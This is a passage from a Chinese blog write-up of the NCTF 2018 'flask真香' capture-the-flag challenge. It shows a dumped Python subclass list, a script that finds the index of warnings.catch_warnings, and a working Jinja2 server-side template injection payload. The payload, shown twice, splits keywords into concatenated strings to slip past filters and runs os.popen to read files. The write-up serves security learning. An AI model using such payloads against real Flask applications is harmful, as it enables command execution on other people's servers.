&#x27;tarfile._LowLevelFile&#x27;&gt;, &lt;class &#x27;_random.Random&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Headers&#x27;&gt;, &lt;class &#x27;pathlib._Accessor&#x27;&gt;, &lt;class &#x27;werkzeug.serving.BaseWSGIServer&#x27;&gt;, &lt;class &#x27;http.cookiejar.Cookie&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.json._JSONModule&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableListMixin&#x27;&gt;, &lt;class &#x27;logging.LogRecord&#x27;&gt;, &lt;class &#x27;flask.helpers.locked_cached_property&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;&gt;, &lt;class &#x27;click.utils.PacifyFlushWrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;dis.Bytecode&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_hashlib.HASH&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;&gt;, &lt;class &#x27;contextlib._RedirectStream&#x27;&gt;, &lt;class &#x27;_lzma.LZMADecompressor&#x27;&gt;, &lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;, &lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;click.core.Parameter&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;, &lt;class &#x27;_pickle.Pdata&#x27;&gt;, &lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;, &lt;class &#x27;tarfile.TarInfo&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi._RangeWrapper&#x27;&gt;, &lt;class &#x27;_ssl._SSLContext&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;difflib.SequenceMatcher&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;pickle._Unpickler&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;werkzeug.local.Local&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;, &lt;class &#x27;_pickle.PicklerMemoProxy&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContext&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinBytes&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.RuleTemplate&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;argparse._ActionsContainer&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;werkzeug.urls.Href&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;argparse.FileType&#x27;&gt;, &lt;class &#x27;decimal.Decimal&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalProxy&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinStr&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.UpdateDictMixin&#x27;&gt;, &lt;class &#x27;_socket.socket&#x27;&gt;, &lt;class &#x27;pathlib.PurePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures._omd_bucket&#x27;&gt;, &lt;class &#x27;weakref.finalize&#x27;&gt;, &lt;class &#x27;_ctypes.CThunkObject&#x27;&gt;, &lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;flask.helpers._PackageBoundObject&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;, &lt;class &#x27;inspect.Signature&#x27;&gt;, &lt;class &#x27;urllib.request.HTTPPasswordMgr&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.cors.CORSRequestMixin&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;flask.signals._FakeSignal&#x27;&gt;, &lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;, &lt;class &#x27;socketserver.ThreadingMixIn&#x27;&gt;, &lt;class &#x27;logging.Filterer&#x27;&gt;, &lt;class &#x27;werkzeug.serving._SSLContext&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;decimal.ContextManager&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileWrapper&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;contextlib.ExitStack&#x27;&gt;, &lt;class &#x27;urllib.request.ftpwrapper&#x27;&gt;, &lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;, &lt;class &#x27;urllib.request.URLopener&#x27;&gt;, &lt;class &#x27;_ssl._SSLSocket&#x27;&gt;, &lt;class &#x27;urllib.parse._NetlocResultMixinBase&#x27;&gt;, &lt;class &#x27;threading.Condition&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;tarfile.TarFile&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;&gt;, &lt;class &#x27;socketserver.BaseServer&#x27;&gt;, &lt;class &#x27;pathlib._Flavour&#x27;&gt;, &lt;class &#x27;pickle._Unframer&#x27;&gt;, &lt;class &#x27;pickle._Framer&#x27;&gt;, &lt;class &#x27;ctypes.CDLL&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;werkzeug.test._TestCookieHeaders&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;pathlib._TerminatingSelector&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;tarfile._StreamProxy&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;pprint._safe_key&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;pickle._Pickler&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ContentRange&#x27;&gt;, &lt;class &#x27;ipaddress._IPv4Constants&#x27;&gt;, &lt;class &#x27;werkzeug.serving.WSGIRequestHandler&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;jinja2.utils.MissingType&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;&gt;, &lt;class &#x27;flask.config.ConfigAttribute&#x27;&gt;, &lt;class &#x27;ipaddress._IPAddressBase&#x27;&gt;, &lt;class &#x27;flask._compat._DeprecatedBool&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.json.JSONMixin&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;, &lt;class &#x27;inspect.Parameter&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;pkgutil.ImpImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;subprocess.CompletedProcess&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;]</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">num=0</span><br><span class="line">alllist=[]</span><br><span class="line">result=&quot;&quot;</span><br><span class="line">for i in classes:</span><br><span class="line">    if i==&quot;&gt;&quot;:</span><br><span class="line">        result+=i</span><br><span class="line">        alllist.append(result)</span><br><span class="line">        result=&quot;&quot;</span><br><span class="line">    elif i==&quot;\n&quot; or i==&quot;,&quot;:</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        result+=i</span><br><span class="line">#寻找要找的类，并返回其索引</span><br><span class="line">for k,v in enumerate(alllist):</span><br><span class="line">    if &quot;warnings.catch_warnings&quot; in v:</span><br><span class="line">        print(str(k)+&quot;---&gt;&quot;+v)</span><br><span class="line">#117---&gt; &lt;class &#x27;warnings.catch_warnings&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&#x27;__cla&#x27;&#x27;ss__&#x27;].__bases__[0][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[117].__init__.__globals__[&#x27;__bui&#x27;&#x27;ltins__&#x27;][&#x27;ev&#x27;&#x27;al&#x27;](&quot;__im&quot;&quot;port__(&#x27;o&#x27;&#x27;s&#x27;).po&quot;&quot;pen(&#x27;cat /T*&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/04/13/NCTF-2018-flask%E7%9C%9F%E9%A6%99/QQ20250413-162036.png" class="" title="QQ20250413-162036">
+
+<p>禁用的关键字就用拼接来绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&#x27;__cla&#x27;&#x27;ss__&#x27;].__bases__[0][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[117].__init__.__globals__[&#x27;__bui&#x27;&#x27;ltins__&#x27;][&#x27;ev&#x27;&#x27;al&#x27;](&quot;__im&quot;&quot;port__(&#x27;o&#x27;&#x27;s&#x27;).po&quot;&quot;pen(&#x27;cat /T*&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SSTI/" rel="tag"><i class="fa fa-tag"></i> SSTI</a>
+              <a href="/tags/Flask/" rel="tag"><i class="fa fa-tag"></i> Flask</a>
+              <a href="/tags/Jinja2/" rel="tag"><i class="fa fa-tag"></i> Jinja2</a>
+          </div>
+
+        
+  <div class="social-like a2a_kit a2a_kit_size_32 a2a_default_style">
+    <a class="a2a_dd" target="_blank" rel="noopener" href="https://www.addtoany.com/share"></a>
+      <a class="a2a_button_facebook"></a>
+      <a class="a2a_button_twitter"></a>
+  </div>
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/04/11/%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5%E7%88%AC%E5%8F%96/" rel="prev" title="漏洞情报爬取">
+                  <i class="fa fa-angle-left"></i> 漏洞情报爬取
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/04/13/XXE%E4%BE%8B%E4%BC%9A%E4%BD%9C%E4%B8%9A/" rel="next" title="XXE 例会作业">
+                  XXE 例会作业 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="waline"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">温柔刀</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">58k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">3:31</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  <script src="/js/third-party/addtoany.js"></script>
+
+  
+
+
+
+
+<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"comment-three-tau.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"说两句吧~","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":true,"comment_count":true,"requiredFields":["nick","mail"],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/2025/04/13/NCTF-2018-flask%E7%9C%9F%E9%A6%99/"}</script>
+<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
+    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
+  ).then(() => 
+    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
+  );
+});
+</script>
+
+</body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
